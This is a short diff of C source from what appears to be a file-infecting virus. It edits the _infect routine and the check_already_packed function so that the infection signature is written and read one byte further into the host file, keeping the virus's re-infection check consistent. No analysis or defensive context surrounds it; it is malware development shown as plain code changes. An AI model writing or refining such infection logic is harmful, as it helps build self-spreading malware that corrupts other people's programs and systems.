@@ -155,7 +155,7 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 		return FALSE;
 	((unsigned char*)key)[0] ^= 0b01110010;
 
-	get_sig(*s, *n, p.bn, (char *)(((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2));
+	get_sig(*s, *n, p.bn, (char *)(((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2)+1);
 
 	ffree(olds2, oldn2);
 	if (olds)
@@ -204,7 +204,7 @@ int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_o
 		return TRUE;
 	if (get_sig(s, n, virus_len, sig) == FALSE)
 		return TRUE;
-	char *p = (char*)(((uint64_t *)(s + entry + dataearly_off)) + 2);
+	char *p = (char*)(((uint64_t *)(s + entry + dataearly_off)) + 2)+1;
 	//size_t *p = ((size_t *)(char*)(s + entry + DATA));
 	//debug("cmp ", sig, " ", p, "\n");
 	if (sncmp(p, sig, sig_len) == 0)
